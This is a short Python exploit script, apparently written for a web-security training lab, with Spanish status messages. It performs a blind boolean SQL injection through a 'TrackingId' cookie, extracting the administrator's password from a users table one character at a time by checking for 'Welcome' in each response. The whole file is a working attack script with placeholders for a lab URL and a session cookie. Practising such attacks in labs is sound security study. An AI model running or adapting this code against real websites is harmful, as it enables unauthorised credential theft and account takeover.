#!/usr/bin/env python3

from pwn import *
import requests
import time
import signal
import sys
import string


def def_handler(sig, frame):
    
	print(f"\n\n[!] Saliendo...")
	sys.exit(1)
	
# Control+C 

signal.signal(signal.SIGINT, def_handler)


def makesqli():

	p1 = log.progress("SQLi")
	p1.status("Iniciando Fuerza bruta")

	url = "{Your Lab URL}"
	characters = string.ascii_lowercase + string.digits

	password = ''
	p2 = log.progress(f'Contraseña')

	for i in range(1,21):

		for character in characters: 


			cookies = {
				'TrackingId': "uhOPvF9x33XD7PuM' and (select substring(password, %d, 1) from users where username='administrator')='%c'-- -" % (i, character),
				'session': '{Your session cookie}}'
			}

			p1.status(cookies['TrackingId'])		
			r = requests.get(url, cookies=cookies)

			if 'Welcome' in r.text:
				password += character
				p2.status(password)
				break

	print(password)
if __name__== '__main__':

	makesqli()